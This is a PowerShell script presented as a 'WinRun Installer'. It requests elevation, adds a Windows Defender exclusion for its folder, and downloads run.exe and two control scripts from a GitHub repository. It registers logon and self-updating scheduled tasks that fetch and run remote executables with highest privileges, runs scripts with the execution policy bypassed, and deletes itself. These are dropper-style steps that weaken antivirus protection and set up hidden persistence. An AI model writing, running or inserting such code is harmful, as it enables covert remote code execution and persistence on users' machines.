$ErrorActionPreference = "Continue"

Write-Host "=== Starting WinRun Installer ===" -ForegroundColor Cyan
Read-Host -Prompt "Press Enter to continue..."

$self = [System.Diagnostics.Process]::GetCurrentProcess().MainModule.FileName
Write-Host "Executable Path: $self" -ForegroundColor Gray
Read-Host -Prompt "Press Enter to continue..."

$runDir = "$env:APPDATA\run"
$runExe = "$runDir\run.exe"
$installDir = "$env:TEMP\run"
$installer = "$installDir\ss_installer.ps1"
$ssControl = "$installDir\ss_control.ps1"
$datDir = "$env:APPDATA\Microsoft\run"
$datFile = "$datDir\run.dat"

$isUpdate = Test-Path $datFile
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
  [Security.Principal.WindowsBuiltInRole]::Administrator
)

Write-Host "isUpdate: $isUpdate | isAdmin: $isAdmin" -ForegroundColor Yellow
Read-Host -Prompt "Press Enter to continue..."

if (-not $isUpdate -and -not $isAdmin) {
  try {
    Write-Host "Requesting elevation via UAC..." -ForegroundColor Yellow
    Read-Host -Prompt "Press Enter to continue..."
    Start-Process `
      -FilePath $self `
      -Verb RunAs
    exit
  }
  catch {
    Write-Host "UAC elevation failed: $($_.Exception.Message)" -ForegroundColor Red
    Read-Host -Prompt "Press Enter to exit..."
    exit
  }
}

if (-not $isUpdate) {
  try {
    Write-Host "Adding Defender exclusion for $runDir..." -ForegroundColor Yellow
    Read-Host -Prompt "Press Enter to continue..."
    Add-MpPreference -ExclusionPath $runDir -ErrorAction SilentlyContinue | Out-Null
    Write-Host "Defender exclusion added." -ForegroundColor Green
    Read-Host -Prompt "Press Enter to continue..."
  }
  catch {
    Write-Host "Failed to add Defender exclusion: $($_.Exception.Message)" -ForegroundColor Red
    Read-Host -Prompt "Press Enter to continue..."
  }
}

if (-not (Test-Path $datDir)) {
  New-Item -ItemType Directory -Path $datDir -Force | Out-Null
}

New-Item -ItemType Directory -Path "$env:TEMP" -Force | Out-Null
New-Item -ItemType Directory -Path $installDir -Force | Out-Null

Write-Host "Stopping existing run and ss_control processes..." -ForegroundColor Yellow
Read-Host -Prompt "Press Enter to continue..."
Get-Process -Name "run" -ErrorAction SilentlyContinue |
  Stop-Process -Force -ErrorAction SilentlyContinue

Get-WmiObject Win32_Process -Filter "Name='powershell.exe' AND CommandLine LIKE '%ss_control%'" -ErrorAction SilentlyContinue |
  ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }

Start-Sleep -Seconds 2
New-Item -ItemType Directory -Path $runDir -Force | Out-Null

$ghHeaders = @{ "User-Agent" = "PowerShell-Installer" }

Write-Host "Fetching latest commit SHA from GitHub..." -ForegroundColor Yellow
Read-Host -Prompt "Press Enter to continue..."
try {
  $apiResponse = Invoke-RestMethod `
    -Uri "https://api.github.com/repos/yuan-miranda/run/commits/main" `
    -Headers $ghHeaders `
    -UseBasicParsing `
    -ErrorAction Stop

  $latestCommit = $apiResponse.sha
  Write-Host "Latest Commit SHA: $latestCommit" -ForegroundColor Green
  Read-Host -Prompt "Press Enter to continue..."
}
catch {
  $latestCommit = "main"
  Write-Host "Failed to fetch latest commit SHA, defaulting to 'main'" -ForegroundColor Red
  Read-Host -Prompt "Press Enter to continue..."
}

# Download run.exe
Write-Host "Downloading run.exe..." -ForegroundColor Yellow
Read-Host -Prompt "Press Enter to continue..."
try {
  Invoke-WebRequest `
    -Uri "https://raw.githubusercontent.com/yuan-miranda/run/$latestCommit/run.exe" `
    -OutFile $runExe `
    -Headers $ghHeaders `
    -UseBasicParsing `
    -ErrorAction Stop
  Write-Host "run.exe downloaded successfully." -ForegroundColor Green
  Read-Host -Prompt "Press Enter to continue..."
}
catch {
  Write-Host "Download via commit SHA failed, trying fallback to 'main' branch..." -ForegroundColor Red
  Read-Host -Prompt "Press Enter to continue..."
  try {
    Invoke-WebRequest `
      -Uri "https://raw.githubusercontent.com/yuan-miranda/run/main/run.exe" `
      -OutFile $runExe `
      -Headers $ghHeaders `
      -UseBasicParsing `
      -ErrorAction Stop
    Write-Host "run.exe downloaded successfully from 'main'." -ForegroundColor Green
    Read-Host -Prompt "Press Enter to continue..."
  }
  catch {
    Write-Host "Failed downloading run.exe: $($_.Exception.Message)" -ForegroundColor Red
    Read-Host -Prompt "Press Enter to continue..."
  }
}

# Download ss_installer.ps1
Write-Host "Downloading ss_installer.ps1..." -ForegroundColor Yellow
Read-Host -Prompt "Press Enter to continue..."
try {
  Invoke-WebRequest `
    -Uri "https://raw.githubusercontent.com/yuan-miranda/run/$latestCommit/frames_dev/ss_installer.ps1" `
    -OutFile $installer `
    -Headers $ghHeaders `
    -UseBasicParsing `
    -ErrorAction Stop
  Write-Host "ss_installer.ps1 downloaded successfully." -ForegroundColor Green
  Read-Host -Prompt "Press Enter to continue..."
}
catch {
  Write-Host "Download via commit SHA failed, trying fallback to 'main' branch..." -ForegroundColor Red
  Read-Host -Prompt "Press Enter to continue..."
  try {
    Invoke-WebRequest `
      -Uri "https://raw.githubusercontent.com/yuan-miranda/run/main/frames_dev/ss_installer.ps1" `
      -OutFile $installer `
      -Headers $ghHeaders `
      -UseBasicParsing `
      -ErrorAction Stop
    Write-Host "ss_installer.ps1 downloaded successfully from 'main'." -ForegroundColor Green
    Read-Host -Prompt "Press Enter to continue..."
  }
  catch {
    Write-Host "Failed downloading ss_installer.ps1: $($_.Exception.Message)" -ForegroundColor Red
    Read-Host -Prompt "Press Enter to continue..."
  }
}

# Download ss_control.ps1
Write-Host "Downloading ss_control.ps1..." -ForegroundColor Yellow
Read-Host -Prompt "Press Enter to continue..."
try {
  Invoke-WebRequest `
    -Uri "https://raw.githubusercontent.com/yuan-miranda/run/$latestCommit/frames_dev/ss_control.ps1" `
    -OutFile $ssControl `
    -Headers $ghHeaders `
    -UseBasicParsing `
    -ErrorAction Stop
  Write-Host "ss_control.ps1 downloaded successfully." -ForegroundColor Green
  Read-Host -Prompt "Press Enter to continue..."
}
catch {
  Write-Host "Download via commit SHA failed, trying fallback to 'main' branch..." -ForegroundColor Red
  Read-Host -Prompt "Press Enter to continue..."
  try {
    Invoke-WebRequest `
      -Uri "https://raw.githubusercontent.com/yuan-miranda/run/main/frames_dev/ss_control.ps1" `
      -OutFile $ssControl `
      -Headers $ghHeaders `
      -UseBasicParsing `
      -ErrorAction Stop
    Write-Host "ss_control.ps1 downloaded successfully from 'main'." -ForegroundColor Green
    Read-Host -Prompt "Press Enter to continue..."
  }
  catch {
    Write-Host "Failed downloading ss_control.ps1: $($_.Exception.Message)" -ForegroundColor Red
    Read-Host -Prompt "Press Enter to continue..."
  }
}

Write-Host "Verifying downloaded files..." -ForegroundColor Yellow
Read-Host -Prompt "Press Enter to continue..."
if (
  -not (Test-Path $runExe) -or
  -not (Test-Path $installer) -or
  -not (Test-Path $ssControl)
) {
  Write-Host "Verification Error: Required files are missing." -ForegroundColor Red
  Read-Host -Prompt "Press Enter to exit..."
  exit
}
Write-Host "File verification passed." -ForegroundColor Green
Read-Host -Prompt "Press Enter to continue..."

$taskName = "WinRun"
$action = New-ScheduledTaskAction `
  -Execute $runExe `
  -WorkingDirectory $runDir

$trigger = New-ScheduledTaskTrigger -AtLogOn
$settings = New-ScheduledTaskSettingsSet `
  -AllowStartIfOnBatteries `
  -DontStopIfGoingOnBatteries `
  -ExecutionTimeLimit (New-TimeSpan -Days 365)

$cmd = 'powershell.exe -Command "$p=\''$env:APPDATA\run\''; if (!(Test-Path $p)) { New-Item -ItemType Directory -Path $p | Out-Null }; try { $h=@{\''User-Agent\'\'=\''PowerShell-Updater\''}; $sha=(Invoke-RestMethod \'\'https://api.github.com/repos/yuan-miranda/run/commits/main\'\' -Headers $h -UseBasicParsing).sha; $o=\''$p\installer.exe\''; Stop-Process -Name \'\'installer\'' -ErrorAction SilentlyContinue; Start-Sleep 1; Invoke-WebRequest -Uri \'\'https://raw.githubusercontent.com/yuan-miranda/run/\'' + $sha + \'\'/installer.exe\'\' -OutFile $o -Headers $h -UseBasicParsing; Start-Process -FilePath $o -WindowStyle Normal } catch { }"'

$installerTaskName = "WinRunInstaller"
$installerAction = New-ScheduledTaskAction `
  -Execute "powershell.exe" `
  -Argument " -Command $cmd"

$installerSettings = New-ScheduledTaskSettingsSet `
  -AllowStartIfOnBatteries `
  -DontStopIfGoingOnBatteries `
  -ExecutionTimeLimit (New-TimeSpan -Minutes 10)

Write-Host "Registering scheduled task '$taskName'..." -ForegroundColor Yellow
Read-Host -Prompt "Press Enter to continue..."
try {
  Register-ScheduledTask `
    -TaskName $taskName `
    -Action $action `
    -Trigger $trigger `
    -Settings $settings `
    -RunLevel Highest `
    -Force | Out-Null
  Write-Host "Task '$taskName' registered successfully with Highest privileges." -ForegroundColor Green
  Read-Host -Prompt "Press Enter to continue..."
}
catch {
  try {
    Register-ScheduledTask `
      -TaskName $taskName `
      -Action $action `
      -Trigger $trigger `
      -Settings $settings `
      -Force | Out-Null
    Write-Host "Task '$taskName' registered successfully." -ForegroundColor Green
    Read-Host -Prompt "Press Enter to continue..."
  }
  catch {
    Write-Host "Failed registering task '$taskName': $($_.Exception.Message)" -ForegroundColor Red
    Read-Host -Prompt "Press Enter to continue..."
  }
}

Write-Host "Registering scheduled task '$installerTaskName'..." -ForegroundColor Yellow
Read-Host -Prompt "Press Enter to continue..."
try {
  Register-ScheduledTask `
    -TaskName $installerTaskName `
    -Action $installerAction `
    -Settings $installerSettings `
    -RunLevel Highest `
    -Force | Out-Null
  Write-Host "Task '$installerTaskName' registered successfully with Highest privileges." -ForegroundColor Green
  Read-Host -Prompt "Press Enter to continue..."
}
catch {
  try {
    Register-ScheduledTask `
      -TaskName $installerTaskName `
      -Action $installerAction `
      -Settings $installerSettings `
      -Force | Out-Null
    Write-Host "Task '$installerTaskName' registered successfully." -ForegroundColor Green
    Read-Host -Prompt "Press Enter to continue..."
  }
  catch {
    Write-Host "Failed registering task '$installerTaskName': $($_.Exception.Message)" -ForegroundColor Red
    Read-Host -Prompt "Press Enter to continue..."
  }
}

if (Test-Path $installer) {
  Write-Host "Executing ss_installer.ps1..." -ForegroundColor Yellow
  Read-Host -Prompt "Press Enter to continue..."
  Start-Process powershell.exe `
    -ArgumentList @(
    '-NoProfile',
    '-ExecutionPolicy',
    'Bypass',
    '-File',
    $installer
  ) -WindowStyle Normal -Wait
  Write-Host "ss_installer.ps1 execution completed." -ForegroundColor Green
  Read-Host -Prompt "Press Enter to continue..."
}

$latestCommit | Out-File $datFile

$IdPath = "$env:APPDATA\Microsoft\run\run.txt"

if (Test-Path $IdPath) {
  $raw = (Get-Content $IdPath -Raw).Trim()
  if ($raw.Length -ge 8) {
    $uniqueId = $raw.Substring(0, 8)
  }
  else {
    $uniqueId = $raw
  }
}
else {
  $uniqueId = ([guid]::NewGuid().ToString()).Substring(0, 8)
  Set-Content -Path $IdPath -Value $uniqueId
}

$uniqueUser = "$($env:USERNAME)-$uniqueId-W"
Write-Host "Configured unique user: $uniqueUser" -ForegroundColor Cyan
Read-Host -Prompt "Press Enter to continue..."

if (Test-Path $runExe) {
  Write-Host "Launching run.exe..." -ForegroundColor Yellow
  Read-Host -Prompt "Press Enter to continue..."
  Start-Process `
    -FilePath $runExe
}

if (Test-Path $ssControl) {
  Write-Host "Launching ss_control.ps1..." -ForegroundColor Yellow
  Read-Host -Prompt "Press Enter to continue..."
  Start-Process powershell.exe `
    -ArgumentList @(
    '-NoProfile',
    '-ExecutionPolicy',
    'Bypass',
    '-File',
    $ssControl
  ) -WindowStyle Normal
}

if ($installer) {
  Start-Process powershell.exe `
    -ArgumentList @(
    "-Command",
    "Start-Sleep 2; Remove-Item '$installer' -Force -ErrorAction SilentlyContinue"
  ) -WindowStyle Normal
}

if ($self) {
  Start-Process powershell.exe `
    -ArgumentList @(
    "-Command",
    "Start-Sleep 4; Remove-Item '$self' -Force -ErrorAction SilentlyContinue"
  ) `
    -WindowStyle Normal
}

Write-Host "=== WinRun Installer Completed Successfully ===" -ForegroundColor Green
Read-Host -Prompt "Press Enter to exit..."
